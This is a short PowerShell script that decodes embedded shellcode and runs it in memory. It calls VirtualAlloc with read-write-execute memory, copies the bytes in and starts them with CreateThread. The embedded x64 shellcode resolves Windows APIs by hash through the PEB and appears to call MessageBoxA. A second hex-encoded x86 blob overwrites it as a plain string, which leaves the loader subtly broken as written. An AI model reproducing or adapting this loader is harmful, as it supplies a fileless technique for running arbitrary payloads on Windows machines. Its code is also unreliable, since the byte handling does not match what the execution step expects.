$base64 = "VUiJ5UiD7Ci5jv4fS+gaAQAASIlF+EiLTfi6BoDoyOiXAAAASIlF8EiLTfi672LAH+iFAAAASIlF6EiNDX8BAABIi33wSIPsKP/XSIPEKEiJReBIi03gSI0VbQEAAEiLfehIg+wo/9dIg8QoSIlF2EgxyUiNFUYBAABMjQVKAQAARTHJSIPsKP/QSIPEKMNIMcBEigFBgPgAdB9BgPhBcgpBgPhadwRBgMggwcAHTQ+2wEwxwEgB0evYw4txPEiNNDGLtogAAABIjTQxi34gjTw5RItOJEaNDAlEiwdOjQQBV1FSVkyJwboBAAAA6J3///9eWllfSDnQdApIg8cESYPBAnXVZkWLSQJJgeH/DwAATWvJBEmD6QREi1YcTQHKTo0UEUWLEkqNBBHDZUiLPCVgAAAASIt/GEiLfxBIif5Mi0ZgQVBXVlFMicG6AgAAAOg5////WV5fQVhIOch0CEiLNkg5/nXYSItGMMNVSInlSIPsGEiJTfhIiVXwTIlF6E0x/0iLVfBKjRS6iwKD+P90GUiLTfiJwugd////SItV6EqJBPpJg8cB69hMifhIiexdwwaA6MjvYsAf/////3VzZXIzMi5kbGwATWVzc2FnZUJveEEA"
$bytes = [Convert]::FromBase64String($base64)
$bytes = "e8000000005a8d52fb5589e583ec10528b827c01000050e8f00000008945fc83c4045a528d45f0508d8297010000508b45fc50e81001000083c40c5a528d9a80010000538b45f0ffd08945f85a528d828b010000508b45f850ff55f489c05a6a006a006a006a00ffd089ec5dc38b54240431c08a1a80fb00741b80fb41720880fb5a770380cb20c1c0070fb6db31d803542408ebde5a83c40852c35589e583ec0c8b5d088b733c8d34338d76788b368d34338b7e208d3c3b897dfc8b7e1c8d3c3b897df48b7e248d3c3b897df831c98b55fc8d148a8b128b5d088d14136a0152e888ffffff3b450c740583c10175e08b55f88d144a31c0668b028b55f48d14828b128b5d088d041389ec5dc35589e5648b3d300000008b7f0c8b7f0c89fe8b56306a0252e844ffffff8b5d0839d874088b3639fe75e8eb078b461889ec5dc3b8ffffffff89ec5dc35589e531c98b5d0c8d1c8b8b1b83fbff741c51538b450850e836ffffff83c408598b5d108d1c8b890383c101ebd789c889ec5dc38efe1f4b7573657233322e646c6c004d657373616765426f7841000680e8c8ef62c01fffffffff"

Write-Host "[+] here"


Add-Type @"
using System;
using System.Runtime.InteropServices;
public class K32 {
    [DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
    [DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint b, IntPtr c, IntPtr d, uint e, IntPtr f);
    [DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint t);
}
"@

$addr = [K32]::VirtualAlloc(0, $bytes.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $addr, $bytes.Length)
$th = [K32]::CreateThread(0,0,$addr,0,0,0)
[K32]::WaitForSingleObject($th, [uint32]::MaxValue)